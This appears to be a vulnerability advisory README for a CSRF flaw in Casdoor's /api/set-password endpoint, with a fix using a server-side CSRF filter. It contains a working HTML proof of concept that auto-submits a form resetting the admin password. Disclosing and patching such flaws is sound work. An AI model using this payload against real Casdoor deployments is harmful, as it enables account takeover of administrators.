# Casdoor – Cross-Site Request Forgery (CSRF)

Summary
- Vulnerability: CSRF in `/api/set-password` allowing password changes without consent.
- Affected versions: All versions of the software are affected. No patched release is currently available.
- CVE: CVE-2023-34927 (latest yet to be assigned).
- Exploit author: Van Lam Nguyen.
- Tested on: Windows

Impact
- If a victim is logged into Casdoor, a cross-site POST can change the victim’s password (e.g., `built-in/admin`), leading to account takeover.

Attack Prerequisites
- Victim is authenticated and has a valid `casdoor_session_id` cookie.
- Victim visits a malicious page that auto-submits a POST to `/api/set-password`.

Proof of Concept
```html
<html>
<form action="http://localhost:8000/api/set-password" method="POST">
    <input name='userOwner' value='built&#45;in' type='hidden'>
    <input name='userName' value='admin' type='hidden'>
    <input name='newPassword' value='hacked' type='hidden'>
    <input type=submit>
</form>
<script>
    history.pushState('', '', '/');
    document.forms[0].submit();
</script>
</html>
```

Root Cause
- State-changing endpoints under `/api/*` accept cookie-authenticated requests without enforcing same-origin checks (`Origin`/`Referer`) or CSRF tokens.

Fix Overview
- Add a server-side CSRF filter to deny cross-site, cookie-based POST/PUT/DELETE/PATCH requests under `/api/*`.
- Allow requests that carry explicit non-cookie authentication (e.g., `Authorization`, Basic auth, client credentials, or `accessToken`) or requests without browser session cookies (typical server-to-server calls).

Implementation
- Use `routers.CSRFFilter` implemented in `csrf_filter.go`. This filter:
  - Early-returns for non-state-changing methods.
  - Allows requests with explicit non-cookie auth.
  - Blocks cross-site requests when a session cookie is present and the origin does not match the host.

How to Integrate into Casdoor
1. Copy `csrf_filter.go` into the existing `routers` package of the Casdoor project. Do not modify or delete anything in this file.
2. Register the filter early in the HTTP pipeline (inside `main`):
   ```go
   // Beego v1 style
   beego.InsertFilter("/api/*", beego.BeforeRouter, routers.CSRFFilter)
   
   // If your project uses Beego v2 and imports as `web`:
   // web.InsertFilter("/api/*", web.BeforeRouter, routers.CSRFFilter)
   ```

Verification
- After registering the filter, replay the PoC above while logged in. The request should be denied with `Unauthorized operation` and the server should log `CSRF check failed`.
- Cross-origin API calls that include `Authorization` headers or `accessToken` parameters should continue to work.

Repository Files
- `csrf_filter.go`: CSRF filter to copy into Casdoor’s `routers` package.
- `poc.html`: Minimal page reproducing the CSRF attack.
- `README.md`: This document describing the vulnerability and fix steps.

References
- Casdoor: https://casdoor.org/
- Version: https://github.com/casdoor/casdoor/releases

Video
- Youtube: https://youtu.be/N5VENgiObjY